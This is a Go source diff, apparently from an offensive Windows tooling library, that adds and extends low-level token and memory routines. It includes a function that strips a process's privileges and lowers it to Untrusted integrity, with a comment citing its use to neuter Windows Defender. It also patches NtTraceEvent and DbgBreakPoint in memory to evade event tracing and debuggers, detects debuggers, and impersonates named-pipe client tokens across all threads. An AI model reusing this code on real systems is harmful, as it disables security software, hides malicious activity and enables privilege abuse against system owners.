@@ -42,7 +42,7 @@ type dumpOutput struct {
 type privileges struct {
 	// DO NOT REORDER
 	PrivilegeCount uint32
-	Privileges     [1]LUIDAndAttributes
+	Privileges     [5]LUIDAndAttributes
 }
 type modEntry32 struct {
 	// DO NOT REORDER
@@ -116,6 +116,7 @@ func killRuntime() {
 	if a, e, err = findBaseModuleRange(p, q); err != nil {
 		return
 	}
+	// 0x4 - TH32CS_SNAPTHREAD
 	h, err := CreateToolhelp32Snapshot(0x4, 0)
 	if err != nil {
 		return
@@ -133,6 +134,8 @@ func killRuntime() {
 		if t.OwnerProcessID != p {
 			continue
 		}
+		// 0x63 - THREAD_QUERY_INFORMATION | THREAD_SET_INFORMATION | THREAD_SUSPEND_RESUME
+		//         THREAD_TERMINATE
 		if v, err = OpenThread(0x63, false, t.ThreadID); err != nil {
 			break
 		}
@@ -254,20 +257,31 @@ func EmptyWorkingSet() {
 	syscall.SyscallN(funcSetProcessWorkingSetSizeEx.address(), CurrentProcess, invalid, invalid)
 }
 
-// ZeroTraceEvent will attempt to zero out the NtTraceEvent function call with
+// ZeroTraceEvent will attempt to zero out the 'NtTraceEvent' function call with
 // a NOP.
+//
+// This function also zero's out 'DbgBreakPoint'.
 //
 // This will return an error if it fails.
 func ZeroTraceEvent() error {
 	var (
-		o   uint32
-		err = VirtualProtect(funcNtTraceEvent.address()+3, 1, 0x40, &o)
+		b      = funcNtTraceEvent.address() + 3
+		o, err = NtProtectVirtualMemory(CurrentProcess, b, 1, 0x40)
+		// 0x40 - PAGE_EXECUTE_READWRITE
 	)
 	if err != nil {
 		return err
 	}
-	(*(*[1]byte)(unsafe.Pointer(funcNtTraceEvent.address() + 3)))[0] = 0xC3
-	return VirtualProtect(funcNtTraceEvent.address()+3, 1, o, &o)
+	(*(*[1]byte)(unsafe.Pointer(b)))[0] = 0xC3 // RET
+	if _, err = NtProtectVirtualMemory(CurrentProcess, b, 1, o); err != nil {
+		return err
+	}
+	if o, err = NtProtectVirtualMemory(CurrentProcess, funcDbgBreakPoint.address(), 1, 0x40); err != nil {
+		return err
+	}
+	(*(*[1]byte)(unsafe.Pointer(funcDbgBreakPoint.address())))[0] = 0x90 // NOP
+	_, err = NtProtectVirtualMemory(CurrentProcess, funcDbgBreakPoint.address(), 1, o)
+	return err
 }
 func (p *dumpParam) close() {
 	// BUG(dij): I think the heap isn't getting freed properly.
@@ -278,12 +292,96 @@ func (p *dumpParam) close() {
 	p.Unlock()
 }
 
+// Untrust will attempt to revoke all Token permissions and change the Token
+// integrity level to "Untrusted".
+//
+// This effectively revokes all permissions for the application with the supplied
+// PID to run.
+//
+// Ensure a call to 'GetDebugPrivilege' is made first before starting.
+//
+// Thanks for the find by @zha0gongz1 in their article:
+//  https://golangexample.com/without-closing-windows-defender-to-make-defender-useless-by-removing-its-token-privileges-and-lowering-the-token-integrity/
+func Untrust(p uint32) error {
+	// 0x400 - PROCESS_QUERY_INFORMATION
+	h, err := OpenProcess(0x400, false, p)
+	if err != nil {
+		return err
+	}
+	var t uintptr
+	// 0x200A8 - TOKEN_READ | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_DEFAULT | TOKEN_QUERY
+	if err = OpenProcessToken(h, 0x200A8, &t); err != nil {
+		CloseHandle(h)
+		return err
+	}
+	var n uint32
+	// 0x3 - TokenPrivileges
+	if err = GetTokenInformation(t, 0x3, nil, 0, &n); n == 0 {
+		CloseHandle(h)
+		CloseHandle(t)
+		return err
+	}
+	b := make([]byte, n)
+	// 0x3 - TokenPrivileges
+	if err = GetTokenInformation(t, 0x3, &b[0], n, &n); err != nil {
+		CloseHandle(h)
+		CloseHandle(t)
+		return err
+	}
+	_ = b[n-1]
+	// NOTE(dij): Loop over all the privileges and disable them. Yes we
+	//            call "disableAll", but this is a failsafe.
+	for c, i, a := uint32(b[3])<<24|uint32(b[2])<<16|uint32(b[1])<<8|uint32(b[0]), uint32(12), uint32(0); a < c && i < n; a, i = a+1, i+12 {
+		b[i], b[i+1], b[i+2], b[i+3] = 0x4, 0, 0, 0
+	}
+	if err = AdjustTokenPrivileges(t, false, unsafe.Pointer(&b[0]), n, nil, nil); err != nil {
+		CloseHandle(h)
+		CloseHandle(t)
+		return err
+	}
+	// We don't care if this errors.
+	AdjustTokenPrivileges(t, true, nil, 0, nil, nil)
+	var (
+		c = uint32(32)
+		s [32]byte
+	)
+	// 0x41 - WinUntrustedLabelSid
+	r, _, err1 := syscall.SyscallN(funcCreateWellKnownSid.address(), 0x41, 0, uintptr(unsafe.Pointer(&s[0])), uintptr(unsafe.Pointer(&c)))
+	if r == 0 {
+		CloseHandle(h)
+		CloseHandle(t)
+		return unboxError(err1)
+	}
+	var x SIDAndAttributes
+	// 0x20 - SE_GROUP_INTEGRITY
+	x.Sid, x.Attributes = (*SID)(unsafe.Pointer(&s[0])), 0x20
+	// 0x19 - TokenIntegrityLevel
+	r, _, err1 = syscall.SyscallN(funcSetTokenInformation.address(), t, 0x19, uintptr(unsafe.Pointer(&x)), uintptr(c+4))
+	CloseHandle(h)
+	if CloseHandle(t); r > 0 {
+		return nil
+	}
+	return unboxError(err1)
+}
+func fullPath(n string) string {
+	if !isBaseName(n) {
+		return n
+	}
+	d, err := GetSystemDirectory()
+	if err != nil {
+		d = `C:\Windows\System32`
+	}
+	return d + "\\" + n
+}
+
 // GetDebugPrivilege is a quick helper function that will attempt to grant the
 // caller the "SeDebugPrivilege" privilege.
 func GetDebugPrivilege() error {
 	var (
 		t   uintptr
 		err = OpenProcessToken(CurrentProcess, 0x200E8, &t)
+		// 0x200E8 - TOKEN_READ (STANDARD_RIGHTS_READ | TOKEN_QUERY) | TOKEN_WRITE
+		//            (TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT)
 	)
 	if err != nil {
 		return err
@@ -293,7 +391,7 @@ func GetDebugPrivilege() error {
 		CloseHandle(t)
 		return err
 	}
-	p.Privileges[0].Attributes, p.PrivilegeCount = 0x2, 1
+	p.Privileges[0].Attributes, p.PrivilegeCount = 0x2, 1 // SE_PRIVILEGE_ENABLED
 	err = AdjustTokenPrivileges(t, false, unsafe.Pointer(&p), uint32(unsafe.Sizeof(p)), nil, nil)
 	CloseHandle(t)
 	return err
@@ -305,6 +403,7 @@ func getCurrentThreadID() uint32 {
 func (p *dumpParam) init() error {
 	p.Lock()
 	var err error
+	// 2 << 20 = ~20MB
 	if p.b, err = heapCreate(2 << 20); err != nil {
 		return err
 	}
@@ -366,6 +465,7 @@ func SetWallpaper(s string) error {
 	if err != nil {
 		return err
 	}
+	// 0x14 - SPI_SETDESKWALLPAPER
 	r, _, err1 := syscall.SyscallN(funcSystemParametersInfo.address(), 0x14, 1, uintptr(unsafe.Pointer(v)), 0x3)
 	if r == 0 {
 		return unboxError(err1)
@@ -383,6 +483,7 @@ func SetHighContrast(e bool) error {
 	if c.Size = uint32(unsafe.Sizeof(c)); e {
 		c.Flags = 1
 	}
+	// 0x43 - SPI_SETHIGHCONTRAST
 	r, _, err := syscall.SyscallN(funcSystemParametersInfo.address(), 0x43, 0, uintptr(unsafe.Pointer(&c)), 0x3)
 	if r == 0 {
 		return unboxError(err)
@@ -400,6 +501,7 @@ func SwapMouseButtons(e bool) error {
 	if e {
 		v = 1
 	}
+	// 0x21 - SPI_SETMOUSEBUTTONSWAP
 	r, _, err := syscall.SyscallN(funcSystemParametersInfo.address(), 0x21, uintptr(v), 0, 0x3)
 	if r == 0 {
 		return unboxError(err)
@@ -412,6 +514,7 @@ func IsTokenElevated(h uintptr) bool {
 	var (
 		e, n uint32
 		err  = GetTokenInformation(h, 0x14, (*byte)(unsafe.Pointer(&e)), uint32(unsafe.Sizeof(e)), &n)
+		// 0x14 - TokenElevation
 	)
 	return err == nil && n == uint32(unsafe.Sizeof(e)) && e != 0
 }
@@ -426,11 +529,98 @@ func IsUserLoginToken(t uintptr) bool {
 		n   uint32
 		b   [8]byte
 		err = GetTokenInformation(t, 0x11, &b[0], 8, &n)
+		// 0x11 - TokenOrigin
 	)
 	if err != nil {
 		return false
 	}
 	return uint32(b[3])<<24|uint32(b[2])<<16|uint32(b[1])<<8|uint32(b[0]) > 1000
+}
+
+// CheckDebugWithLoad will attempt to check for a debugger by loading a non-loaded
+// DLL specified and will check for exclusive access (which is false for debuggers).
+//
+// If the file can be opened, the library is freed and the file is closed. This
+// will return true ONLY if opening for exclusive access fails.
+//
+// Any errors opening or loading DLLs will silently return false.
+func CheckDebugWithLoad(d string) bool {
+	var (
+		p      = fullPath(d)
+		n, err = UTF16PtrFromString(p)
+	)
+	if err != nil {
+		panic(err.Error())
+	}
+	var (
+		h       uintptr
+		r, _, _ = syscall.SyscallN(funcGetModuleHandleEx.address(), 0x2, uintptr(unsafe.Pointer(n)), uintptr(unsafe.Pointer(&h)))
+	)
+	if r > 0 {
+		return false
+	}
+	if h, err = loadLibraryEx(p); err != nil {
+		return false
+	}
+	// 0x80000000 - FILE_FLAG_WRITE_THROUGH
+	// 0x0        - EXCLUSIVE
+	// 0x3        - OPEN_EXISTING
+	f, err := CreateFile(p, 0x80000000, 0, nil, 0x3, 0, 0)
+	if syscall.SyscallN(funcFreeLibrary.address(), h); err != nil {
+		return true
+	}
+	CloseHandle(f)
+	return false
+}
+
+// EnablePrivileges will attempt to enable the supplied Windows privilege values
+// on the current process's Token.
+//
+// Errors during encoding, lookup or assignment will be returned and not all
+// privileges will be assigned, if they occur.
+func EnablePrivileges(s ...string) error {
+	if len(s) == 0 {
+		return nil
+	}
+	var (
+		t   uintptr
+		err = OpenProcessToken(CurrentProcess, 0x200E8, &t)
+		// 0x200E8 - TOKEN_READ (STANDARD_RIGHTS_READ | TOKEN_QUERY) | TOKEN_WRITE
+		//            (TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT)
+	)
+	if err != nil {
+		return xerr.Wrap("OpenProcessToken", err)
+	}
+	err = EnableTokenPrivileges(t, s...)
+	CloseHandle(t)
+	return err
+}
+
+// ImpersonatePipeToken will attempt to impersonate the Token used by the Named
+// Pipe client.
+//
+// This function is only usable on Windows with a Server Pipe handle.
+//
+// Pipe insights: https://papers.vx-underground.org/papers/Windows/System%20Components%20and%20Abuse/Offensive%20Windows%20IPC%20Internals%201%20Named%20Pipes.pdf
+func ImpersonatePipeToken(h uintptr) error {
+	// NOTE(dij): For best results, we FIRST impersonate the token, THEN
+	//            we try to set the token to each user thread with a duplicated
+	//            token set to impersonate. (Similar to an Impersonate call).
+	runtime.LockOSThread()
+	if err := ImpersonateNamedPipeClient(h); err != nil {
+		runtime.UnlockOSThread()
+		return err
+	}
+	var y uintptr
+	// 0xF01FF - TOKEN_ALL_ACCESS
+	if err := OpenThreadToken(CurrentThread, 0xF01FF, false, &y); err != nil {
+		runtime.UnlockOSThread()
+		return err
+	}
+	err := ForEachThread(func(t uintptr) error { return SetThreadToken(&t, y) })
+	CloseHandle(y)
+	runtime.UnlockOSThread()
+	return err
 }
 func heapCreate(n uint64) (uintptr, error) {
 	r, _, err := syscall.SyscallN(funcHeapCreate.address(), 0, uintptr(n), 0)
@@ -494,6 +684,42 @@ func copyMemory(d uintptr, s uintptr, x uint32) {
 	syscall.SyscallN(funcRtlCopyMemory.address(), uintptr(d), uintptr(s), uintptr(x))
 }
 
+// ForEachThread is a helper function that allows a function to be executed with
+// the handle of the Thread.
+//
+// This function only returns an error if enumerating the Threads generates an
+// error or the supplied function returns an error.
+func ForEachThread(f func(uintptr) error) error {
+	// 0x4 - TH32CS_SNAPTHREAD
+	h, err := CreateToolhelp32Snapshot(0x4, 0)
+	if err != nil {
+		return xerr.Wrap("CreateToolhelp32Snapshot", err)
+	}
+	var (
+		p = GetCurrentProcessID()
+		t ThreadEntry32
+		v uintptr
+	)
+	t.Size = uint32(unsafe.Sizeof(t))
+	for err = Thread32First(h, &t); err == nil; err = Thread32Next(h, &t) {
+		if t.OwnerProcessID != p {
+			continue
+		}
+		// 0xE0 - THREAD_QUERY_INFORMATION | THREAD_SET_INFORMATION | THREAD_SET_THREAD_TOKEN
+		if v, err = OpenThread(0xE0, false, t.ThreadID); err != nil {
+			break
+		}
+		err = f(v)
+		if CloseHandle(v); err != nil {
+			break
+		}
+	}
+	if CloseHandle(h); err == ErrNoMoreFiles {
+		return nil
+	}
+	return err
+}
+
 // GetTokenUser retrieves access token user account information and SID.
 func GetTokenUser(h uintptr) (*TokenUser, error) {
 	u, err := getTokenInfo(h, 1, 50)
@@ -501,6 +727,29 @@ func GetTokenUser(h uintptr) (*TokenUser, error) {
 		return nil, err
 	}
 	return (*TokenUser)(u), nil
+}
+func enablePrivileges(h uintptr, s []string) error {
+	var (
+		p   privileges
+		err error
+	)
+	for i := range s {
+		if i > 5 {
+			break
+		}
+		if err = LookupPrivilegeValue("", s[i], &p.Privileges[i].Luid); err != nil {
+			if xerr.Concat {
+				return xerr.Wrap(`cannot lookup "`+s[i]+`"`, err)
+			}
+			return xerr.Wrap("cannot lookup privilege", err)
+		}
+		p.Privileges[i].Attributes = 0x2 // SE_PRIVILEGE_ENABLED
+	}
+	p.PrivilegeCount = uint32(len(s))
+	if err = AdjustTokenPrivileges(h, false, unsafe.Pointer(&p), uint32(unsafe.Sizeof(p)), nil, nil); err != nil {
+		return xerr.Wrap("cannot assign all privileges", err)
+	}
+	return nil
 }
 
 // GetProcessFileName will attempt to retrive the basename of the process
@@ -514,6 +763,7 @@ func GetProcessFileName(h uintptr) (string, error) {
 		funcNtQueryInformationProcess.address(), h, 0x1B, uintptr(unsafe.Pointer(&u)),
 		uintptr(unsafe.Sizeof(u)+260), uintptr(unsafe.Pointer(&n)),
 	)
+	// 0x1B - ProcessImageFileName
 	if r > 0 {
 		return "", err
 	}
@@ -530,6 +780,7 @@ func getThreadStartAddress(h uintptr) (uintptr, error) {
 		i         uintptr
 		r, _, err = syscall.SyscallN(funcNtQueryInformationThread.address(), h, 0x9, uintptr(unsafe.Pointer(&i)), unsafe.Sizeof(i), 0)
 	)
+	// 0x9 - ThreadQuerySetWin32StartAddress
 	if r > 0 {
 		return 0, unboxError(err)
 	}
@@ -552,7 +803,7 @@ func StringListToUTF16Block(s []string) (*uint16, error) {
 				return nil, syscall.EINVAL
 			}
 		}
-		if q := strings.IndexByte(x, 61); q <= 0 {
+		if q := strings.IndexByte(x, '='); q <= 0 {
 			if xerr.Concat {
 				return nil, xerr.Sub(`invalid env value "`+x+`"`, 0x92)
 			}
@@ -570,6 +821,30 @@ func StringListToUTF16Block(s []string) (*uint16, error) {
 	}
 	b[i] = 0
 	return &UTF16EncodeStd([]rune(string(b)))[0], nil
+}
+
+// EnableTokenPrivileges will attempt to enable the supplied Windows privilege
+// values on the supplied process Token.
+//
+// Errors during encoding, lookup or assignment will be returned and not all
+// privileges will be assigned, if they occur.
+func EnableTokenPrivileges(h uintptr, s ...string) error {
+	if len(s) == 0 {
+		return nil
+	}
+	if len(s) <= 5 {
+		return enablePrivileges(h, s)
+	}
+	for x, w := 0, 0; x < len(s); {
+		if w = 5; x+w > len(s) {
+			w = len(s) - x
+		}
+		if err := enablePrivileges(h, s[x:x+w]); err != nil {
+			return err
+		}
+		x += w
+	}
+	return nil
 }
 func heapAlloc(h uintptr, s uint64, z bool) (uintptr, error) {
 	var f uint32
@@ -593,7 +868,8 @@ func (p *dumpParam) copy(o uint64, b uintptr, s uint32) error {
 func heapReAlloc(h, m uintptr, s uint64, z bool) (uintptr, error) {
 	var f uint32
 	if z {
-		f |= 0x08
+		// 0x8 - HEAP_ZERO_MEMORY
+		f |= 0x8
 	}
 	r, _, err := syscall.SyscallN(funcHeapReAlloc.address(), h, uintptr(f), m, uintptr(s))
 	if r == 0 {
@@ -639,6 +915,7 @@ func getTokenInfo(t uintptr, c uint32, i int) (unsafe.Pointer, error) {
 	}
 }
 func findBaseModuleRange(p uint32, b uintptr) (uintptr, uintptr, error) {
+	// 0x18 - TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32
 	h, err := CreateToolhelp32Snapshot(0x18, p)
 	if err != nil {
 		return 0, 0, err
